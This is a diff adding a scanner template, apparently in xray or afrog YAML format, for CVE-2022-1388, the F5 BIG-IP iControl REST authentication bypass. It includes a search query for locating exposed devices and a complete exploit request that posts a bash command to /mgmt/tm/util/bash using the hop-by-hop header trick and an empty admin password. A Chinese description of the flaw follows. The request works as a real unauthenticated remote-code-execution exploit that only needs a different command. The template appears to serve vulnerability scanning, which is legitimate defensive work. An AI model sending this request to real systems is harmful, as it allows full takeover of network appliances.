@@ -1,0 +1,25 @@
+name: F5 BIG-IP iControl REST 远程代码执行(CVE-2022-1388)
+manual: true
+query: title="BIG-IP&reg;- Redirect"
+transport: http
+rules:
+  r0:
+    request:
+      method: POST
+      path: /mgmt/tm/util/bash
+      headers:
+        Authorization: Basic YWRtaW46
+        Connection: Keep-Alive, X-F5-Auth-Token
+        X-F5-Auth-Token: aa
+      body: '{"command":"run","utilCmdArgs":"-c id"}'
+    expression: response.status != 204 && response.body.bcontains(b"uid")
+expression: r0()
+detail:
+  author: hou5
+  links:
+  - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-1388
+  description: 2022年05月05日，F5官方发布了CVE-2022-1388 F5 BIG-IP iControl REST 远程代码执行漏洞。F5
+    BIG-IP是美国F5公司的一款集成了网络流量管理、应用程序安全管理、负载均衡等功能的应用交付平台。iControl REST 是iControl 框架的演变，使用
+    REpresentational State Transfer (REST)。这允许用户或脚本与 F5 设备之间进行轻量级、快速的交互。CVE-2022-1388
+    中，攻击者可在无需身份认证的情况下调用相关Rest API，从而执行任意命令。
+  tags: RCE
